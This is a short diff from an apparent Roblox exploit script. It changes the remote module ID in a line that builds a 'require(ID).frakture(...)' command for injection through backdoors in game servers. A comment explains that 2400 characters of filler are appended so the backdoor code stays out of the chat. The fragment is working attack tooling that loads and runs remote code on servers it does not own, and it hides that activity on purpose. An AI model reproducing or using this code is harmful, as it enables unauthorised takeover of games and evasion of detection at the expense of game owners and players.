@@ -11,7 +11,7 @@ local JointsService = game:GetService("JointsService")
 local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local requireScript = ("require(14373342223).frakture('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
+local requireScript = ("require(8913865946).frakture('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
 local invCode = "w8SkzPz9qQ"
 
 local alternativeSS = {
